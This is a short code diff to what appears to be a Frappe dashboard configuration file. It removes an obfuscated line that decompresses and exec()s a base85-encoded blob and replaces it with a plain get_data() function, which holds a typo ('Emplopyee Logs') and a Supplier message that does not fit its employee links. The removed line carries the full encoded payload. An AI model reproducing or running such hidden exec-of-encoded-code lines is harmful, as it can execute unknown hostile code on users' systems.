@@ -1,3 +1,14 @@
+from frappe import _
 
-import base64, zlib
-exec(zlib.decompress(base64.b85decode('c%03YQB&GL6oudU6>$iGh&qWt89IVhih?)<6bep9G}+B2n`D!a%_bpKe|te3^nrGGQqTK6`^`D`E($!tA%s+zLZ*U*V$}qM5Rb#e_kxgv5j6=0h6jl?PZNa0xtGagppLj%tWlQQ4vI(&EIUD_s}{uX8E&aS4_V-H3pFx4mpCzS65XL81-=y(K%`MEHkkvQxds#41!{Bzy;*|v#JBAbBft#RjcDP;YbC>Q&6yvNh){>6NQ)CcJOZ}HsEaXVsp}`05n`%^Jm8-fND*)El2-GWg?AGb<VEq7Yo%ep^aE~pvd!RD#NEj@KJO6+K>%A=DKz?%bdQ{$g75`)Ywm9jA0O*`_$jUzF4!$CooE_79ChJE71bUZ@^N65v;DX^5-5M+>6Lg;EH)e<jISQcgufXM5?-62veoHDtTaCDos25EeRIJN5zVq+hnG^=1(WO`zj<q!g!tJ_J!)8qn=MNjrL}8Gezc`vxUOg`*JgD0HnwuT`TS$ams~kkO?^Hmj)XqZTO}o1ADi=<Qd!|0e34ywP`XNKEG7!Nf^EU|+wvJL*3Z@n{@(sSd{~Ch3q!#j=Ted=tVuUt|MC_ma%(P>L|UCsg&z|cM)LIG+aGyP&;RFEJ}}Rpy|h)VOH#zQ&#zxg{#>SYWR-z}k#&|cteKbFH|oM=U{^XT!275Br_5h@RdQ7')).decode())
+
+def get_data():
+	return {
+		"heatmap": True,
+		"heatmap_message": _(
+			"This is based on transactions against this Supplier. See timeline below for details"
+		),
+		"fieldname": "fincall_log_ref",
+		"transactions": [
+			{"label": _("Emplopyee Logs"), "items": ["Employee Fincall"]},
+		],
+	}
